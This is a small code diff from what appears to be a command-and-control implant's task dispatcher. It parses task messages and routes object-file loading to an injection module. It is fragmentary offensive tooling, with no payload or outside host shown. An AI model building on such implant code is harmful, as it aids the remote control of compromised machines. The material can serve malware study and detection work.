@@ -239,9 +239,9 @@ namespace Dispatcher {
         _parser parser = { };
 
         Parser::CreateParser(&parser, B_PTR(in->Buffer), in->Length);
-        Parser::UnpackDword(&parser);
+        Parser::UnpackDword(&parser); // throw-away pid todo: maybe generate new pid every task?
 
-        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&parser);
+        Ctx->Session.CurrentTaskId = Parser::UnpackDword(&parser);
 
         auto msg_type = Parser::UnpackDword(&parser);
         switch (msg_type) {
@@ -258,7 +258,7 @@ namespace Dispatcher {
             }
             case TypeObject: {
                 // load a BOF file
-                Memory::Execute::LoadObject(parser)
+                Injection::LoadObject(parser)
             }
 
             default:
